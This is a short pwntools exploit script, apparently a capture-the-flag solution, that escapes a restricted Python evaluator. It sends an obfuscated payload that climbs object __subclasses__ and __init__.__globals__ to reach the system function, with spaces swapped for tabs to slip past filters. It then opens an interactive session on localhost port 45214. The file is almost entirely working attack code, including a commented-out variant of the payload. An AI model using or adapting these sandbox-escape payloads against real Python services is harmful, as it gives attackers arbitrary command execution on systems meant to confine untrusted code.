from pwn import *

# payload = b'[x:=_!=_,y:=-~x,z:=_.__name__,d:=[].__doc__]+[_[z[x]+z[-y]]for _.__class_getitem__ in[_[_.__base__][-~y*~y*~y*~y*~y*~y*~y-~y*~y*~y-~y*-~y].__init__.__globals__[z[x]+d[~-~y*~y*~y*~y*~y*~y-~y*~y*-~y-y]+z[x]+z[~y*~y]+z[~y*~y-y]+z[-~y]]for _.__class_getitem__ in[_.__class__.__subclasses__]]]'
payload = b'[x:=_!=_,y:=-~x,z:=_.__name__]+[__builtins__:=_[_.__base__][-~y*~y*~y*~y*~y*~y*~y-~y*~y*~y-~y*-~y].__init__.__globals__ for _.__class_getitem__ in[_.__class__.__subclasses__]]+[_[z[x]+z[-y]]for _.__class_getitem__ in[_[_]for _.__class_getitem__ in[lambda x:system]]]'
payload = payload.replace(b' ', b'\t')

p = remote('localhost', '45214')
p.sendline(payload)
p.interactive()